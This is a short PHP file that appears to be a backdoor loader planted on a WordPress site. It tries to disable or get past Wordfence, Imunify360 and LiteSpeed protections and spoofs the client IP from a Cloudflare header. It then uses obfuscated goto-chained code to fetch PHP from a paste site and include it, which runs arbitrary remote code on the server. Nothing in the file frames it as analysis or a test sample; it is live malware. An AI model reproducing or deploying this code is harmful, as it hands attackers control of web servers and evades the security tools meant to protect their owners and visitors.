<?=/**/@null; 
// Disable LiteSpeed cache
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

// Disable Wordfence live traffic and file modifications
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

// Bypass Imunify360 request
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
}

// Use Cloudflare connecting IP if available
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
}
goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("https://paste.myconan.net/531366.txt")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["uri"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
